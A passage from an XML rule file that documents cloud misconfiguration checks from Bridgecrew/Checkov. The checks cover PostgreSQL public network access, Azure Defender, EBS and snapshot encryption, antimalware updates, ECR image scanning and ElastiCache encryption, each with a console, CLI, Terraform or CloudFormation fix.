  resource_arn            = aws_wafv2_web_acl.example.arn
  redacted_fields {
    single_header {
      name = "user-agent"
    }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_logging_33' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_logging_33</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_logging_33' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_68</key>
    <name>Ensure PostgreSQL server disables public network access</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="postgresql-server-does-not-disable-public-network-access"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-postgre-sql-server-does-not-disable-public-network-access"></div>PostgreSQL server does not disable public network access</div><a aria-label="Skip link to PostgreSQL server does not disable public network access" class="heading-anchor-icon fa fa-anchor" href="#postgresql-server-does-not-disable-public-network-access"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Disabling the public network access property improves security by ensuring your Azure Database for PostgreSQL single servers can only be accessed from a private endpoint. This configuration strictly disables access from any public address space outside of Azure IP range and denies all logins that match IP or virtual network-based firewall rules.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_postgresql_server</li>
<li><strong>Argument:</strong> public_network_access_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_postgresql_server" "example" {
              ...
+             public_network_access_enabled    = false
              ...
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-disables-public-network-access' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-disables-public-network-access</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-disables-public-network-access' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_69</key>
    <name>Ensure Azure Security Center Defender is set to On for Azure SQL database servers</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-security-center-defender-is-set-to-off-for-azure-sql-database-servers"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-security-center-defender-is-set-to-off-for-azure-sql-database-servers"></div>Azure Security Center Defender is set to Off for Azure SQL database servers</div><a aria-label="Skip link to Azure Security Center Defender is set to Off for Azure SQL database servers" class="heading-anchor-icon fa fa-anchor" href="#azure-security-center-defender-is-set-to-off-for-azure-sql-database-servers"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure Defender is a cloud workload protection service that utilizes and agent-based deployment to analyze signals from Azure network fabric and the service control plane, to detect threats across all Azure resources. It can also analyze non-Azure resources, utilizing Azure Arc, including those on-premises and in both AWS and GCP (once they've been onboarded). </p>
<p>Azure Defender for SQL servers on machines extends the protections for your Azure-native SQL Servers to fully support hybrid environments and protect SQL servers (all supported version) hosted in Azure</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_security_center_subscription_pricing</li>
<li><strong>Argument:</strong> resource_type - (Required) The resource type this setting affects. Ensure that <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">SqlServers</code> and <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">SqlServerVirtualMachines</code> are declared to pass this check.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_security_center_subscription_pricing" "example" {
  tier          = "Standard"
  resource_type = "AppServices,ContainerRegistry,KeyVaults,KubernetesService,SqlServers,SqlServerVirtualMachines,StorageAccounts,VirtualMachines,ARM,DNS"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-azure-sql-database-servers' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-azure-sql-database-servers</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-azure-sql-database-servers' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_3</key>
    <name>Ensure AWS EBS volumes are encrypted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-ebs-volumes-are-not-encrypted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-ebs-volumes-are-not-encrypted"></div>AWS EBS volumes are not encrypted</div><a aria-label="Skip link to AWS EBS volumes are not encrypted" class="heading-anchor-icon fa fa-anchor" href="#aws-ebs-volumes-are-not-encrypted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Encrypting EBS volumes ensures that replicated copies of your images are secure even if they are accidentally exposed. AWS EBS encryption uses AWS KMS customer master keys (CMK) when creating encrypted volumes and snapshots. Storing EBS volumes in their encrypted state reduces the risk of data exposure or data loss.<br/>
We recommend you encrypt all data stored in the EBS.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <strong><a href="https://console.aws.amazon.com/ec2/" target="_self">Amazon EC2 console</a></strong>.</li>
<li>From the navigation bar, select <strong>Region</strong>.</li>
<li>From the navigation pane, select <strong>EC2 Dashboard</strong>.</li>
<li>In the upper-right corner of the page, select <strong>Account Attributes</strong>, then <strong>Settings</strong>.</li>
<li>Under <strong>EBS Storage</strong>, select <strong>Always encrypt new EBS volumes</strong>.</li>
<li>Click <strong>Update</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To always encrypt new EBS volumes, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">aws ec2 --region &lt;REGION&gt; enable-ebs-encryption-by-default
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_ebs_volume</li>
<li><strong>Argument</strong>: encrypted - (Optional) If true, the disk will be encrypted. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_ebs_volume" "example" {
  ...
  availability_zone = "${var.availability_zone}"
+ encrypted         = true
  ...
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::EC2::Volume</li>
<li><strong>Argument</strong>: Properties.Encrypted - (Optional) If true, the disk will be encrypted. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources: 
  NewVolume:
    Type: AWS::EC2::Volume
    Properties: 
      ...
+     Encrypted: true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/general_3-encrypt-eps-volume' target='_blank'> https://docs.bridgecrew.io/docs/general_3-encrypt-eps-volume</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/general_3-encrypt-eps-volume' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_CUSTOM_3</key>
    <name>Ensure all data stored in the EBS snapshot is securely encrypted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="not-all-data-stored-in-the-ebs-snapshot-is-securely-encrypted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-not-all-data-stored-in-the-ebs-snapshot-is-securely-encrypted"></div>Not all data stored in the EBS snapshot is securely encrypted</div><a aria-label="Skip link to Not all data stored in the EBS snapshot is securely encrypted" class="heading-anchor-icon fa fa-anchor" href="#not-all-data-stored-in-the-ebs-snapshot-is-securely-encrypted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>EBS snapshots must be encrypted, as they often include sensitive information, customer PII or CPNI.  Amazon EBS encryption uses AWS Key Management Service (AWS KMS) customer master keys (CMK) when creating encrypted volumes and snapshots. With EBS encryption enabled, you no longer have to build, maintain, and secure your own key management infrastructure.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <strong><a href="https://console.aws.amazon.com/ec2/" target="_self">Amazon EC2 console</a></strong>.</li>
<li>From the navigation bar, select <strong>Region</strong>.</li>
<li>From the navigation pane, select <strong>EC2 Dashboard</strong>.</li>
<li>In the upper-right corner of the page, click <strong>Account Attributes</strong>, then <strong>EBS encryption</strong>.</li>
<li>click <strong>Manage</strong>.</li>
<li>For Default encryption key, select a symmetric customer managed CMK.</li>
<li>Click <strong>Update EBS encryption</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To enable EBS encryption by default:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws ec2 enable-ebs-encryption-by-default
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_ebs_snapshot</li>
<li><strong>Argument</strong>: encrypted - Whether the snapshot is encrypted.<br/>
Example fix:</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_ebs_snapshot</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_ebs_snapshot">resource "aws_ebs_snapshot" "example" {
  volume_id = "${aws_ebs_volume.example.id}"
+ encrypted = true
  ...
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/general_7' target='_blank'> https://docs.bridgecrew.io/docs/general_7</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/general_7' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AZURE_10</key>
    <name>Ensure Microsoft Antimalware is configured to automatically update Virtual Machines</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="microsoft-antimalware-is-not-configured-to-automatically-update-virtual-machines"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-microsoft-antimalware-is-not-configured-to-automatically-update-virtual-machines"></div>Microsoft Antimalware is not configured to automatically update Virtual Machines</div><a aria-label="Skip link to Microsoft Antimalware is not configured to automatically update Virtual Machines" class="heading-anchor-icon fa fa-anchor" href="#microsoft-antimalware-is-not-configured-to-automatically-update-virtual-machines"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy audits any Windows virtual machine not configured with automatic update of Microsoft Antimalware protection signatures.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_virtual_machine, azurerm_virtual_machine_extension</li>
<li><strong>Argument:</strong> virtual_machine_id (of <em> azurerm_virtual_machine_extension</em> )</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_virtual_machine" "virtual_machine_good_1" {
  name                  = "acctvm"
  location              = "location"
  resource_group_name   = "group"
  network_interface_ids = ["id"]
  vm_size               = "Standard_F2"
  storage_os_disk {
    name          = "myosdisk1"
    caching       = "ReadWrite"
    create_option = "FromImage"
  }
}


resource "azurerm_virtual_machine_extension" "extension_good_1" {
  name                 = "hostname"
+ virtual_machine_id   = azurerm_virtual_machine.virtual_machine_good_1.id
  publisher            = "Microsoft.Azure.Security"
  type                 = "IaaSAntimalware"
  type_handler_version = "2.0"
  auto_upgrade_minor_version = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-microsoft-antimalware-is-configured-to-automatically-updates-for-virtual-machines' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-microsoft-antimalware-is-configured-to-automatically-updates-for-virtual-machines</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-microsoft-antimalware-is-configured-to-automatically-updates-for-virtual-machines' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_163</key>
    <name>Ensure ECR image scan on push is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="ecr-image-scan-on-push-is-not-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-ecr-image-scan-on-push-is-not-enabled"></div>ECR image scan on push is not enabled</div><a aria-label="Skip link to ECR image scan on push is not enabled" class="heading-anchor-icon fa fa-anchor" href="#ecr-image-scan-on-push-is-not-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon ECR is a fully managed container registry used to store, manage and deploy container images. ECR Image Scanning assesses and identifies operating system vulnerabilities. Using automated image scans you can ensure container image vulnerabilities are found before getting pushed to production. ECR APIs notify if vulnerabilities were found when a scan completes.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <strong><a href="https://console.aws.amazon.com/ecr/repositories" target="_self">Amazon ECR console</a></strong>.</li>
<li>Select a repository using the radio button.</li>
<li>Click <strong>Edit</strong>.</li>
<li>Enable the <strong>Scan on push</strong> toggle.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To create a repository configured for <strong>scan on push</strong>:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws ecr create-repository
--repository-name name
--image-scanning-configuration scanOnPush=true
--region us-east-2
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_ecr_repository</li>
<li><strong>Argument:</strong> scan_on_push - (Required) Indicates whether images are scanned after being pushed to the repository (true) or not scanned (false). </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_ecr_repository.foo.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_ecr_repository.foo.tf">resource "aws_ecr_repository" "example" {
  ...
  image_tag_mutability = "MUTABLE"
+  image_scanning_configuration {
+    scan_on_push = true
+  }
  ...
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::ECR::Repository</li>
<li><strong>Argument:</strong> Properties.ImageScanningConfiguration.ScanOnPush - (Required) Indicates whether images are scanned after being pushed to the repository (true) or not scanned (false). </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  ImageScanTrue:
    Type: AWS::ECR::Repository
    Properties: 
      ...
+     ImageScanningConfiguration:
+       ScanOnPush: true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/general_8' target='_blank'> https://docs.bridgecrew.io/docs/general_8</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/general_8' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_29</key>
    <name>Ensure AWS ElastiCache Redis cluster with encryption for data at rest is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-elasticache-redis-cluster-with-encryption-for-data-at-rest-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-elasti-cache-redis-cluster-with-encryption-for-data-at-rest-is-disabled"></div>AWS ElastiCache Redis cluster with encryption for data at rest is disabled</div><a aria-label="Skip link to AWS ElastiCache Redis cluster with encryption for data at rest is disabled" class="heading-anchor-icon fa fa-anchor" href="#aws-elasticache-redis-cluster-with-encryption-for-data-at-rest-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>ElastiCache for Redis offers default encryption at rest as a service, as well as the ability to use your own symmetric customer-managed customer master keys in AWS Key Management Service (KMS).</p>
<p>ElastiCache for Redis at-rest encryption encrypts the following aspects:</p>
<ul>
<li>Disk during sync, backup and swap operations</li>
<li>Backups stored in Amazon S3</li>
</ul>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="elasticache-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-elasti-cache-console"></div>ElastiCache Console</div><a aria-label="Skip link to ElastiCache Console" class="heading-anchor-icon fa fa-anchor" href="#elasticache-console"></a></h2>
<p>To create a replication group using the <strong>ElastiCache console</strong>, make the following selections:</p>
<ol>
<li>Engine: redis.</li>
<li>Engine version: 3.2.6, 4.0.10 or later.</li>
<li>Encryption at-rest list: Yes.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>The following operation creates the Redis (cluster mode disabled) replication group my-classic-rg with three nodes (--num-cache-clusters), a primary and two read replicas. At-rest encryption is enabled for this replication group (--at-rest-encryption-enabled).</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws elasticache create-replication-group \
    --replication-group-id my-classic-rg \
    --replication-group-description "3 node replication group" \
    --cache-node-type cache.m4.large \
    --engine redis \
    --engine-version 4.0.10 \
    --at-rest-encryption-enabled \  
    --num-cache-clusters 3 \
    --cache-parameter-group default.redis4.0
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_elasticache_replication_group</li>
<li><strong>Argument</strong>: at_rest_encryption_enabled - (Optional) Whether to enable encryption at rest.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_elasticache_replication_group" "default"{
  ...
  replication_group_id          = "default-1"
+ at_rest_encryption_enabled    = true
  ...
}
